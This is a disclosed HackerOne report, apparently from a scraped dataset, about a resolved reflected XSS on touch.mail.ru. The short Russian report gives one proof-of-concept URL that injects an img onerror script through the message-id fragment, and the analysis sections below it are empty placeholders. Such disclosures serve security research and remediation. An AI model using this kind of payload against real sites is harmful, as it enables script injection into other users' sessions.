---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '28832'
original_report_id: '28832'
title: touch.mail.ru XSS via message id
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-09-21T06:53:28.949Z'
disclosed_at: '2014-12-10T18:50:41.837Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# touch.mail.ru XSS via message id

## Metadata

- HackerOne Report ID: 28832
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2014-12-10T18:50:41.837Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

воспроизводится в IE11
уязвимы элементы принимающие значение id письма.
к примеру `https://touch.mail.ru/cgi-bin/msglist#readmsg/14112810510000000915"><img src=x onerror=alert(8)>`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
